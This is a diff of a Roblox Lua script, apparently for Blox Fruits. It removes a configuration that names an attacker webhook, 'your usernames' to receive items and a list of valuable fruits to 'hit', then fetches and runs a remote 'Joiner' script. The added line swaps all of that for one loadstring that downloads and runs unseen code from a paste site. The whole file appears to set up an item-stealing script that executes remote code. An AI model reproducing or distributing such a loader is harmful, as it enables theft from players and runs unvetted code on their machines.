@@ -1,4 +1,1 @@
-Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/21c75c33-6859-49aa-bd8a-7a2eb136a0cc" -- << Protected Webhook Here
-Usernames = {"N1ghT5la5h", "tobyjohnsonthepro"} -- << Your usernames here, you can add as many alts as you want
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Control-Control", "T-Rex-T-Rex", "Spirit-Spirit", "Mammoth-Mammoth", "Venom-Venom", "Gravity-Gravity"} -- << Fruits you want the script to detect
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
+loadstring(game:HttpGet("https://pastefy.app/wncxDXng/raw"))()
